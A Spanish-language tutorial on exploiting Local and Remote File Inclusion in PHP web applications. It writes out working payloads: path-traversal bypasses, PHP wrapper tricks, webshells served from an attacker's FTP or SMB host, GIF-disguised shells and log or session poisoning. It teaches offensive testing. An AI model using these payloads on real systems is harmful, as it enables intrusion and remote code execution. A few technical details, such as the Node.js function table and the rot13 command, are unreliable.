# 1. Cómo funciona el LFI

Muchos lenguajes de back-end modernos, como `PHP`, `Javascript` o `Java` permiten especificar lo que se muestra en la página web, indicando que recurso local (archivo) cargar gracias a un parámetro HTTP. Esto permite crear webs dinámicas sin tener que complicar mucho el código. 

> [!CAUTION]
Si estas funcionalidades no se codifican de forma segura, un atacante puede manipular estos parámetros para mostrar el contenido de cualquier archivo local en el servidor de alojamiento, lo que conduce a una vulnerabilidad de "inclusión de archivos locales"  (`LFI`)

Si permitimos que el usuario abuse de este parámetro de carga de páginas o archivos, podrá apuntar a cualquier archivo del sistema. Esto permitirá ataques como:

- **Acceso a archivos sensibles del sistema**, como el `/etc/passwd`, la configuración del servidor web o claves de acceso.
- **Exposición del código fuente de la web**, permitiendo encontrar otros ataques.
- **Ejecución de código remoto en el servidor** (`RCE`): bajo ciertas condiciones

---
#### Motores de plantillas
El lugar más común dónde se pueden encontrar `LFI` son los motores de plantillas.

Un motor de plantillas permite reutilizar una estructura común (header, barra de busqueda y footer) y rellenarla con contenido que cambia. Esto evita tener que **escribir el encabezado y el footer en cada página**.

*Por ejemplo tenemos una web de venta de ropa deportiva. En el header habrá siempre un menú de secciones (camisetas, pantalones), una barra de búsqueda, un contenido dinámico (el tipo de producto que estemos consultando o el producto concreto) y un footer con promociones y un indice del catalogo de productos.*

En la url podemos ver una estructura similar a esta `/tienda.php?page=camisetas` dónde la página se carga con el parámetro `àge`

----
#### Ejemplos de código vulnerable

La vulnerabilidad `LFI` puede en muchos servidores web y frameworks con lenguajes diferentes (`PHP`, `NodeJS`, `Java`, `.Net` ...). Cada uno de ellos tiene un enfoque ligeramente diferente para incluir archivos locales, pero todos comparten una cosa en común: **cargar un archivo desde una ruta especificada**.

*Un ejemplo de LFI es la utilidad de cambiar el idioma: `?language=es` caga la página  `/es/index.html` y `/en/` carga `/en/index.html` o en Express.sj con una webroute `/about/:language` 🡆 `/about/es` *

Algunas funciones solo leen el contenido de los archivos especificados, mientras que otras también los ejecutan. Por ejemplo no es lo mismo cargar una foto (solo se lee) que un archivo del código backend (se ejecuta).

| Tipo   | Solo lee                                                           | Lee y ejecuta                                              |
| ------ | ------------------------------------------------------------------ | ---------------------------------------------------------- |
| PHP    | `file_get_contents()`, `fopen()`/`file()`                          | `include()`/`include_once()`, `require()`/`require_once()` |
| Nodejs | `res.render()`                                                     | `fs.readFile()`, `fs.sendFile()`                           |
| Java   | `import url`                                                       | `include file`                                             |
| .NET   | `@Html.Partial` , `@Html.RemotePartial()` o `Response.WriteFile()` | `include`                                                  |

## 1.1. LFI básico

#### LFI básico
Tenemos una web que nos permite cambiar el idioma `http://web.com/index.php?language=es.php`. En la URL, el parámetro `language` cambia según el idioma que seleccionamos (`es.php`). 

Por tanto ¿Y si queremos leer un archivo del sistema? Pues simplemente **cambiamos la página que se carga con el parámetro**.
```
http://web.com/index.php?language=es.php
http://web.com/index.php?language=/etc/passwd
```

En ese caso, el código original `PHP` era muy simple: `include($_GET['language']);`

Por tanto podemos fuzzear archivos para leer cualquier contenido gracias a estos diccionarios de rutas:

| Tipo                         | Solo lee                                                                                                                                         |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Archivos de Linux            | [LFI-WordList-Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)                                      |
| Archivos de Windows          | [LFI-WordList-Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)                                  |
| Webroot de Linux             | [webroot](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/default-web-root-directory-linux.txt)           |
| Webroot de Windows           | [webroot_windows](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
| Archivos de servidor Linux   | [server-linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)                                            |
| Archivos de servidor Windows | [server-windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)                                        |

-----------
#### Path traversal
En el ejemplo anterior, leímos un archivo especificando su `ruta absoluta` (p. ej., `/etc/passwd`). Esto funcionaría si toda la entrada se usara dentro de la función `include()` sin ninguna adición. 

> [!NOTE]
> **Puede que los desarolladores web indiquen que se busque desde una ruta relativa (desde el webroot).**  Por tanto si ponemos la ruta tal cual dará error. El path traversal nos permitirá escapar del webroot hasta navegar a la raíz del sistema de archivos mediante los saltos de directorio `../`

```bash
# Código fuente
include("./languages/" . $_GET['language']);

http://web.com/index.php?language=es.php # /var/www/html/languages/es.php
http://web.com/index.php?language=/etc/passwd # /var/www/html/languages//etc/passwd
http://web.com/index.php?language=../../../../etc/passwd # /etc/passwd
```

---
#### Path traversal sanitizado
El servidor puede crear filtros para eliminar los caracteres que permiten el path traversal `../`
```bash
# Se quitan los ".//"
$language = str_replace('../', '', $_GET['language']);

http://web.com/index.php?language=../../../../etc/passwd # /var/www/html/languages//etc/passwd
```

Por tanto según cómo esté programado el filtro, podremos usar cadenas que lo evadan. Por ejemplo si elimina el `../` podremos poner `....//` para que se quede en `../`.

Otra manera de evadir los filtros de caracteres no permitidos es mediante el urlencoding de nuestra entrada. Si la aplicación web objetivo no permitiera `.` y `/` en nuestra entrada, podemos codificar en URL `../` como `%2e%2e%2f`, lo que podría evadir el filtro. **Para que esto funcione, debemos codificar en URL todos los caracteres, incluidos los puntos**. Algunos codificadores de URL pueden no codificar los puntos, ya que se consideran parte del esquema de la URL. Incluso en ciertos casos usar un doble urlencoding.

Para automatizar el proceso podemos usar un [wordlist de bypass](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt).

Tambien existen las white y blacklists

| Tipo                                          | Ejemplo          | Bypass                                        |
| --------------------------------------------- | ---------------- | --------------------------------------------- |
| **Whitelist:** Una parte debe existir si o si | `/file/note.txt` | `?note=/file/note/../../../etc/passwd`        |
| **Blacklist**: no se permiten ciertas cadenas | `/etc/passwd`    | `?note=/etc///passwd` o `?note=/etc/passwd/.` |

---
#### Rutas Aprobadas
Algunas aplicaciones web también pueden usar regex para asegurar que el archivo que se incluye esté bajo una ruta específica. 

Por ejemplo bajo `./languages`, de la siguiente manera:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) { include($_GET['language']); }
```

Para encontrar la ruta aprobada, podemos examinar las peticiones enviadas por los formularios existentes y ver qué ruta usan para la funcionalidad normal de la web. Además, podemos hacer fuzzing de directorios web bajo la misma ruta y probar diferentes hasta que obtengamos una coincidencia.

Para evadir esto, podemos comenzar nuestro payload con la ruta aprobada, y luego usar un path traversal para retroceder al directorio raíz y leer el archivo que especificamos:
```
http://web.com/index.php?language=./languages/../../../../etc/passwd
```

> Esto se puede combinar con las otras tecnicas, URLencodeando nuestro payload

----
#### Extensiones añadidas
Otra medida de sanitización posible es forzar a que se añada una extensión en nuestro código forzando a que solo se pueda cargar un tipo de archivo. Ej `.html` o `.jpg`

```
include($_GET['language'] . ".jpg");
```

> ⚠️ Estas técnicas están obsoletas en las versiones modernas de PHP y solo funcionan con versiones de PHP anteriores a 5.3/5.4

```bash
# Null Byte: Todo se ignora tras el byte nulo
http://web.com/index.php?language=../../../../etc/passwd%00.jpg # /etc/passwd

# Null Byte + markdown
http://web.com/index.php?language=../../../../etc/passwd%00.jpg.md # /etc/passwd

# PHP también solía eliminar las / al final o los puntos individuales en los nombres de ruta
http://web.com/index.php?language=../../../../etc/passwd/.  # /etc/passwd

# En Linx se ignoran múltiples barras diagonales en la ruta
http://web.com/index.php?language=../../../../////etc/////passwd # /etc/passwd

# En sistemas antiguos, hay truncamiento a partir de los 4096 caracteres
echo -n "noexiste/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

----
## 1.2. Uso de wrappers
Si identificamos una vulnerabilidad LFI (Local File Inclusion) en aplicaciones web PHP, podemos utilizar diferentes wrappers para poder leer archivos o llegar al RCE

> [!INFO]
> Los PHP Wrappers nos permiten acceder a diferentes flujos de E/S (Entrada/Salida) a nivel de aplicación, como la entrada/salida estándar, los descriptores de archivos y los flujos de memoria.

#### Wrapper filter
Para usar el wrapper `filter` usaremos la sintaxis `php://filter/`.  Este tiene parámetros como  `resource` (a que archivo aplicar el wrapper) y `read` (aplicar filtros). 

```bash
# Wrapper básico
?image=php?=file:///etc/passwd

# Convertir en base64
?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd

# Convertir en utf-16
?file=php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd   

# Aplicar rot13
?file=php://filter/read=string.rot13/resource=/etc/passwd 
$: cat data |tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-0]'

# Wrapper glob: adivinar con el * cada letra segun el content lenght
?file=glob:///etc/passw* 
```

El wrapper de base64 es necesario para poder mostrar código fuente como texto plano sin que este se interprete. Esto sirve para archivos `PHP` o `.ini`. Si se añade la extesión automáticamente como en este caso, no poner el `.php`
```bash
?file=php://filter/read=convert.base64-encode/resource=config # printea config.php
?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Por ejemplo el archivo `.ini` nos puede chivar las funciones permitidas como `allow_url_include = On` que nos permite usar el wraper `data`

----
#### Wrapper Data
Depende de la configuración `allow_url_include = On`  del `php.ini`. Esta es  necesaria para varios otros ataques LFI, como el uso del wrapper `input` o para cualquier ataque `RFI`. Aunque no esté habilitada por defecto, se habilita a mano porque muchas apps web dependen de ella para que funcionen algunos plugins y temas de CMS como wodpress. 

Ytenemos wrappers que permiten **RCE**
```bash
# Base64
$: echo '<php_webshell>' | base64
?file=data://text/plain;base64,PD9w(...)&cmd=id
```

----
#### Wrapper Input
Este tambien se puede usar para incluir entradas externas y ejecutar código PHP al igual que con `data` (y tambien depende de `allow_url_include`). La diferencia esque input utiliza el método `POST`. 

En este caso enviarmos una solicitid POST con la webshell como datos. Para ejecutar un comando, lo pasaríamos como un parámetro GET a la webshell:
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' 
"http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Para que esto funcione necesitamos que la función acepte tanto GET como POST (usando `$REQUEST`). Si solo acepta POST, podemos usar el comando en el código PHP `<?php system('id')?>` en lugar de cargar una webshell dinámica.

---
#### Wrapper Exect
Es un comando que nos permite ejecutar comandos directamente a través de flujos de URL. Sin embargo es un wrapper externo, por lo que debe instalarse y habilitarse manualmente en el servidor back-end. Pero algunas webs específicas lo necesitan para funcionar.

En PHP init aparecería así: `extension=expect`
```bash
curl -s "http://web/index.php?language=expect://id" | grep uid
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


---
#### Cadenas PHP - POP chains
Es una técnica de explotación que aprovecha métodos mágicos y el comportamiento de objetos en PHP durante la deserialización para encadenar acciones de distintas clases.

Podemos usar [esta herramienta](https://github.com/synacktiv/php_filter_chain_generator) que genera una `gadget chain` a partir de codificar el payload en base64 e ir generandolo letra a letra mediante conversiones de formato. Se aprovecha del wrapper `filter` y `resource`
```bash
# Ej: 'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',

$: python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
# php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SF7|convert.base64-decode/resource=php://temp

$: php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.S...F7|convert.base64-decode/resource=php://temp');"
```


-----------
## 1.3. LFI de segundo orden (Second-Order)

> [!NOTE]
> Es otro tipo de `LFI`, dónde **la funcionalidad extrae archivos del servidor _back-end_ basándose en parámetros controlados por el usuario.** 

*Por ejemplo, una aplicación web puede permitirnos descargar nuestro avatar a través de una URL. En este caso envenenaríamos el nombre del usuario y descargaremos el archivo*
```bash
http://web.com/profile/$username/avatar.png  # Nuestra foto de usuario
http://web.com/profile/jessica/avatar.png  # Ejemplo normal

http://web.com/profile/../../../etc/passwd # /etc/passwd
```

**Los desarrolladores a menudo pasan por alto estas vulnerabilidades, ya que pueden protegerse contra la entrada directa del usuario (p. ej., de un parámetro `?page`), pero pueden confiar en los valores extraídos de su base de datos, como nuestro nombre de usuario en este caso.**


-----------
# 2. RFI

En algunos casos, también podríamos incluir archivos remotos si la función vulnerable permite la inclusión de URL remotas. A esto se le llama `RFI` ("Remote File Inclusion"). Esto permite

- Enumerar puertos y aplicaciones web solo locales (es decir, SSRF)
- Obtener ejecución remota de código al incluir un script malicioso que nosotros alojamos

Cuando una función vulnerable nos permite incluir archivos remotos, es posible que podamos alojar un script malicioso y luego incluirlo en la página vulnerable para ejecutar funciones maliciosas y obtener ejecución remota de código. 

----
## 2.1. RFI

#### RFI y LFI
Una vulnerabilidad `RFI` siempre es tambien una `LFI` ya que cualquier función que permite incluir URL remotas generalmente también permite incluir las locales pero no al reves por tres razones.

1. La función vulnerable puede no permitir la inclusión de URL remotas
2. Puede que solo controles una porción del nombre de archivo y no todo el envoltorio de protocolo (ej.: `http://`, `ftp://`, `https://`).
3. La configuración puede impedir por completo la RFI, ya que la mayoría de los servidores web modernos desactivan la inclusión de archivos remotos por defecto (`allow_url_include = Off`)

La forma más fiable de determinar si una vulnerabilidad LFI también RFI es intentar incluir una URL local como por ejemplo
```
?language=https://127.0.0.1:80/index.php
```

Si se muestra y se ejecuta, significará que el `RFI` permite la ejecución de código malicioso en el mismo lenguaje que está escrito el backend (Ej, `PHP`).

> Es mejor no incluir la propia página vulnerable (es decir, `index.php`), ya que esto podría causar un bucle de inclusión recursiva y provocar una denegación de servicio (DoS) en el servidor back-end.

Por tanto creamos una webshell maliciosa y la cargamos
```bash
$: echo '<?php system($_GET["cmd"]); ?>' > shell.php
$: sudo python -m pyftpdlib -p 21
# http://web.com/index.php?language=ftp://<IP_kali>/shell.php&cmd=id
# http://web.com/index.php?language=ftp://kali:kali@<IP_kali>/shell.php&cmd=id
```

----
#### Windows
Si la aplicación web vulnerable está alojada en un servidor Windows, entonces no necesitamos que la configuración `allow_url_include` esté habilitada para la explotación de RFI, ya que podemos utilizar el protocolo SMB para la inclusión de archivos remotos. Esto se debe a que Windows trata los archivos en servidores SMB remotos como archivos normales, a los que se puede hacer referencia directamente con una ruta UNC.

Podemos levantar un servidor SMB usando `smbserver.py` de Impacket, que permite la autenticación anónima por defecto, de la siguiente manera:
```bash
$: impacket-smbserver -smb2support share $(pwd)

# http://web.com/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```


----
#### LFI y carga de archivos
Se peude explotar la funcionalidad de carga de archivos mediante un `LFI`. En este caso no se vulnera el formulario de carga de archivos, sino que se ejecuta el código del archivo que incluyamos, independientemente de la extensión o el tipo de archivo. 

Recordemos que esto ocurre si la función de carga de archivos tiene permisos de ejecución.

Por ejemplo, creamos un archivo de imagen (`shell.jpg`) con una webshell dentro:
```
$: echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Luego lo subimos y accedemos a él por el LFI. Obtenemos la url de subida al inspeccionar el código fuente
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
<!-- Ruta 🡆 /var/www/html/profile_images/shell.gif-->

http://web.com/index.php?language=./profile_images/shell.gif&cmd=id
```

---
## 2.2. Log poisoning

Estos ataques permiten escribir código PHP en un campo que controlamos y que se registra en un archivo de log (es decir, `envenenar`/`contaminar` el archivo de log) y luego incluir ese archivo de log para ejecutar el código PHP. Para que este ataque funcione, la aplicación web PHP debe tener privilegios de lectura sobre los archivos de log, los cuales varían de un servidor a otro.

Obviamente requiere de funciones de carga con capacidades de ejecución

----
#### Envenenamiento de sesiones PHP (PHP Session Poisoning)
La mayoría de las aplicaciones web PHP utilizan cookies `PHPSESSID`, que pueden contener datos específicos relacionados con el usuario en el back-end, para que la aplicación web pueda hacer un seguimiento de los detalles del usuario a través de sus cookies. Estos detalles se almacenan en archivos de `session` en el back-end, y se guardan en `/var/lib/php/sessions/` en Linux y en `C:\Windows\Temp\` en Windows. 

El nombre del archivo que contiene los datos de nuestro usuario coincide con el nombre de nuestra cookie `PHPSESSID` con el prefijo `sess_`. Por ejemplo, si la cookie `PHPSESSID` se establece en `nhhv8i0o6ua4g88bkdl9u1fdsd`, entonces su ubicación en el disco sería `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`.

Por tanto para el ataque debemos examinar nuestro archivo `PHPSESSID` y ver si contiene algún dato que podamos controlar y envenenar
```
http://web.com/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

Podemos ver que el archivo de sesión contiene dos valores: `page`, que muestra la página de idioma seleccionada, y `preference`, que muestra el idioma seleccionado. El valor de `page` está bajo nuestro control (`?language=`). Por tanto escribiremos una webshell urlencodeada en el parámetro `?language=`
```
http://web.com/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

http://web.com/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

Para ejecutar otro comando, el archivo de sesión tiene que ser envenenado con la shell web de nuevo. Idealmente, usaríamos la shell web envenenada para escribir una shell web permanente en el directorio web, o enviar una shell inversa para una interacción más fácil.

---
#### Envenenamiento de logs del servidor
Tanto `Apache` como `Nginx` mantienen varios archivos de log con información sobre las peticiones hechas al servidor. Como podemos controlar el contenido de la cabecera `User-Agent`, la aprovechamos para el envenenamiento:

| Tipo   | Permisos                                                               | Lee y ejecuta                                 |
| ------ | ---------------------------------------------------------------------- | --------------------------------------------- |
| Apache | Usuarios privilegiados salvo en servidores antiguos o mal configurados | `/var/log/apache2/` y `C:\xampp\apache\logs\` |
| Nginx  | Todo el mundo puede acceder (`www-data`)                               | `/var/log/nginx/` y `C:\nginx\log\`           |

Si están en otra ruta, se usará el  [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) para avergiguar su ubicación

```
curl http://web-com/index.php -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

http://web-com/index.php?language=/var/log/apache2/access.log&cmd=id
```

> **Consejo:** La cabecera `User-Agent` también se muestra en los archivos de proceso bajo el directorio `/proc/` de Linux. Por lo tanto, podemos intentar incluir los archivos `/proc/self/environ` o `/proc/self/fd/N` (donde N es un PID generalmente entre 0-50), y podríamos realizar el mismo ataque en estos archivos. 

Podemos aplicar envenenamiento de logs sobre estos archivos: `/var/log/sshd.log`, `/var/log/mail` y `/var/log/vsftpd.log`









